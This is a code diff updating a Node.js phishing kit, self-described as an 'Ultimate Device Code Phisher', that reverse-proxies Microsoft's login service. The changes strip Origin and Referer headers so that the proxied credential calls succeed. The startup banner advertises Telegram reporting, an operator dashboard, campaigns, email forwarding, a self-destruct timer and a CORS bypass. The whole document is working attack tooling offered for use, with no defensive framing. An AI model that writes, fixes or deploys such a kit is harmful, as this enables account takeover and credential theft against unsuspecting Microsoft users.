@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.6 – Proxied API Calls
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.7 – Origin Stripped
 // ============================================================
-// Fixed GetCredentialType CORS error by intercepting fetch/XHR.
+// Fixed GetCredentialType 500 error by stripping Origin/Referer.
 // ============================================================
 
 const http = require('http');
@@ -655,7 +655,7 @@ app.all('/login*', async (req, res) => {
     const targetBase = 'https://login.microsoftonline.com';
     let targetPath = req.url.replace(/^\/login/, '');
     
-    // 🔥 CRITICAL FIX: Rewrite GET requests to root /login to the authorize endpoint with CLIENT_ID
+    // 🔥 Rewrite GET requests to root /login to the authorize endpoint with CLIENT_ID
     const method = req.method;
     if (method === 'GET' && (!targetPath || targetPath === '/' || targetPath === '' || targetPath.startsWith('?'))) {
         const params = new URLSearchParams({
@@ -668,10 +668,13 @@ app.all('/login*', async (req, res) => {
     }
     const targetUrl = targetBase + targetPath;
 
+    // 🔥 STRIP PROBLEMATIC HEADERS
     const headers = { ...req.headers };
     delete headers.host;
     delete headers['content-length'];
     delete headers['transfer-encoding'];
+    delete headers['origin'];       // <-- FIX: Removed to prevent 500 error
+    delete headers['referer'];      // <-- FIX: Removed to prevent API confusion
     headers['Host'] = 'login.microsoftonline.com';
 
     let bodyData = null;
@@ -1069,7 +1072,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.6 – Proxied API Calls running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.7 – Origin Stripped running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1077,7 +1080,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Full reverse-proxy with CORS bypass: ACTIVE`);
+    console.log(`🚀 Full reverse-proxy with CORS bypass and Origin stripped: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
